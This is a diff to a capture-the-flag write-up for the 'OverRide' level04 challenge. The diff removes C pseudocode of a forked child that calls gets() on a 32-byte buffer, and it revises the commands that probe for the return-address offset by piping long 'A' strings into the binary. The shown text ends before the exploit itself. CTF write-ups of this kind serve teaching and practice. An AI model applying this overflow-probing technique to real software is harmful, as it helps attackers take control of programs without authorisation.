@@ -45,29 +45,6 @@ The parent ensures execution control, while the child has a critical vulnerabili
 		0x0804875e: call   gets@plt          ; Vulnerable gets call
 ```
 
-**pseudocode:**
-
-```c
-int main() {
-    pid_t pid = fork();    // Creates two processes
-    char buffer[32] = {0}; // 32-byte buffer
-
-    if (pid == 0) {        // Child process
-        prctl(1, 1);       // Set death signal
-        ptrace(0, 0, 0, 0);// Anti-debug setup
-        
-        puts("Give me some shellcode, k");
-        gets(buffer);      // Vulnerable gets
-    }
-    else {                 // Parent process
-        wait(&status);     // Wait for child
-        ptrace(3, pid, 44, 0); // Monitor child
-        
-        if (status == 11)  // Check for exec
-            puts("no exec() for you");
-    }
-}
-```
 
 ## **Vulnerability**
 
@@ -107,17 +84,21 @@ $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 Next, we need to find the offset of the return address by analyzing what happens when we input various lengths.
 
 ```python
-# 154 bytes: Program exits normally
-python -c 'print "A"*154' | ./level04
-child is exiting...
+    # 0xb0 
+    python -c 'print "A"*176' | ./level04
+    ...
 
-# 155 bytes: Program exits normally
-python -c 'print "A"*155' | ./level04
-child is exiting...
+    python -c 'print "A"*172' | ./level04
+    ...
+    [...]
 
-# 156 bytes: Program behavior changes
-python -c 'print "A"*156' | ./level04
-Give me some shellcode, k
+    python -c 'print "A"*156' | ./level04
+    Give me some shellcode, k
+
+    # 152 bytes: Program behavior changes
+    level04@OverRide:~$ python -c 'print "A"*152' | ./level04
+    Give me some shellcode, k
+    child is exiting...
 ```
 
 Now we can create the proper exploit:
